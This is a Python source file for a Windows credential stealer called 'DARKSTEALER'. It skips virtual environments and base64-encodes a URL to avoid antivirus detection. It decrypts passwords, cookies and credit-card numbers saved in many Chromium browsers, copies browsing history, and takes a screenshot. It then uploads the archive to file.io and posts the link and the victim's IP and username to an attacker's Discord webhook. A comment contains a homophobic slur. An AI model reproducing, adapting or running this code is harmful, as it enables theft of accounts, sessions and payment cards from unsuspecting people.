import sys, requests
def get_prefix():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
if get_prefix() != sys.prefix:
    sys.exit()
import os, json, base64, shutil, sqlite3
import os.path
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from datetime import datetime


user = os.path.expanduser("~")
appdata = os.getenv('LOCALAPPDATA')
username = os.path.expanduser("~")[9:]
IP = requests.get(base64.b64decode("aHR0cHM6Ly9hcGkuaXBpZnkub3JnLw==").decode("utf-8")).text # leave as that because it less detected cos most av will scan for strings which can get ur ip
wasd = base64.b64decode("go to https://base64decode.org and put ur webhook and then put in here there").decode('utf-8')

try:
    os.makedirs(user+"\\AppData\\Local\\Temp\\Info")
except:
    shutil.rmtree(user+"\\AppData\\Local\\Temp\\Info")
    os.makedirs(user+"\\AppData\\Local\\Temp\\Info")

browsers = {
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass
total_browsers = 0


def save_results(browser_name, data_type, content):
    global total_browsers

    if not os.path.exists(user+'\\AppData\\Local\\Temp\\info\\Browser'):
        os.mkdir(user+'\\AppData\\Local\\Temp\\info\\Browser')
    if not os.path.exists(user+f'\\AppData\\Local\\Temp\\info\\Browser\\{browser_name}'):
        os.mkdir(user+f'\\AppData\\Local\\Temp\\info\\Browser\\{browser_name}')
    if content is not None:
        open(user+f'\\AppData\\Local\\Temp\\info\\Browser\\{browser_name}\\{data_type}.txt', 'w', encoding="utf-8").write(content)
    total_browsers += 1

def get_login_data(path: str, profile: str, master_key):
    login_db = f'{path}\\{profile}\\Login Data'
    if not os.path.exists(login_db):
        return
    result = ""
    shutil.copy(login_db, user+'\\AppData\\Local\\Temp\\login_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\login_db')
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        password = decrypt_password(row[2], master_key)
        result += f"""
        URL: {row[0]}
        Email: {row[1]}
        Password: {password}
        
        """
    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\login_db')
    return result


def get_credit_cards(path: str, profile: str, master_key):
    cards_db = f'{path}\\{profile}\\Web Data'
    if not os.path.exists(cards_db):
        return

    result = ""
    shutil.copy(cards_db, user+'\\AppData\\Local\\Temp\\cards_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cards_db')
    cursor = conn.cursor()
    cursor.execute(
        'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        card_number = decrypt_password(row[3], master_key)
        result += f"""
        Name Card: {row[0]}
        Card Number: {card_number}
        Expires:  {row[1]} / {row[2]}
        Added: {datetime.fromtimestamp(row[4])}
        
        """

    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\cards_db')
    return result


def get_cookies(path: str, profile: str, master_key):
    cookie_db = f'{path}\\{profile}\\Network\\Cookies'
    if not os.path.exists(cookie_db):
        return
    result = ""
    shutil.copy(cookie_db, user+'\\AppData\\Local\\Temp\\cookie_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cookie_db')
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        cookie = decrypt_password(row[3], master_key)

        result += f"""
        Host Key : {row[0]}
        Cookie Name : {row[1]}
        Path: {row[2]}
        Cookie: {cookie}
        Expires On: {row[4]}
        
        """

    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\cookie_db')
    return result


def get_web_history(path: str, profile: str):
    web_history_db = f'{path}\\{profile}\\History'
    result = ""
    if not os.path.exists(web_history_db):
        return

    shutil.copy(web_history_db, user+'\\AppData\\Local\\Temp\\web_history_db')
    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\web_history_db')
    cursor = conn.cursor()
    cursor.execute('SELECT url, title, last_visit_time FROM urls')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2]:
            continue
        result += f"""
        URL: {row[0]}
        Title: {row[1]}
        Visited Time: {row[2]}
        
        """
    conn.close()
    os.remove(user+'\\AppData\\Local\\Temp\\web_history_db')
    return result

def installed_browsers():
    results = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results

def mainpass():
    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)

        save_results(browser, 'Passwords', get_login_data(browser_path, "Default", master_key))
        save_results(browser, 'History', get_web_history(browser_path, "Default"))
        save_results(browser, 'Cookies', get_cookies(browser_path, "Default", master_key))
        save_results(browser, 'Cards', get_credit_cards(browser_path, "Default", master_key))

    sstook = False
    sss = ImageGrab.grab()
    try:
        sss.save(user+"\\AppData\\Local\\Temp\\Info\\ss.png")
        sstook = True
    except:
        sstook = False

    ss = {"file": open(user+"\\AppData\\Local\\Temp\\Info\\ss.png", "rb")}
    try:
        os.remove(user+"\\AppData\\Local\\Temp\\Info\\ss.png")
    except:
        pass

    
    shutil.make_archive(user+'\\AppData\\Local\\Temp\\Info', 'zip', user+'\\AppData\\Local\\Temp\\Info')

    files = {'file': open(user+'\\AppData\\Local\\Temp\\Info.zip', 'rb')}
    response = requests.post("https://file.io", files=files).json()
    todo = {
    "username": "DARKSTEALER 😈",
    "content": "||@everyone||",
    "avatar_url": "https://raw.githubusercontent.com/notcurrygoul/DARKSTEALER-/main/OIG.jpg",
    "embeds": [
        {
            "title": "**DARKSTEALER**",
            "fields": [
                {
                    "name": "",
                    "value": "",
                },
                {
                    "name": "",
                    "value": "",
                },
                {
                    "name": "",
                    "value": "",
                },
                {
                    "name": "",
                    "value": "",
                },
                {
                    "name": "File Link:",
                    "value": f"**`{response['link']}`**",
                },
                {
                    "name": "Total Browsers Found:",
                    "value": f"**`{total_browsers}`**",
                    "inline": True
                },
                {
                    "name": "Ip:",
                    "value": f"**`{IP}`**",
                },
                {
                    "name": "Ip Info:",
                    "value": f"**`https://iplocation.io/ip/{IP}`**",
                    "inline": True
                },
                {
                    "name": "User:",
                    "value": f"**`{username}`**",
                },
                {
                    "name": "",
                    "value": "",
                },
                {
                    "name": "",
                    "value": "",
                },
                {
                    "name": "",
                    "value": "",
                },
                {
                    "name": "",
                    "value": "",
                },
                {
                    "name": "",
                    "value": "",
                },
                {
                    "name": "",
                    "value": "",
                },
                {
                    "name": "",
                    "value": f"**DARKSTEALER 😈**",
                    "inline": False
                },
                {
                    "name": "",
                    "value": f"**Made by pen0trat0r**", # dont be a fag and make this urs 
                    "inline": False
                }
            ],
        }
    ],
    }
    headers = {
        "Content-Type": "application/json"
    }
    r = requests.post(wasd, json=todo, data=json.dumps(todo), headers=headers)
                
    try:
        shutil.rmtree(user+"\\AppData\\Local\\Temp\\Info.zip")
        shutil.rmtree(user+"\\AppData\\Local\\Temp\\Info")
    except:
        pass

mainpass()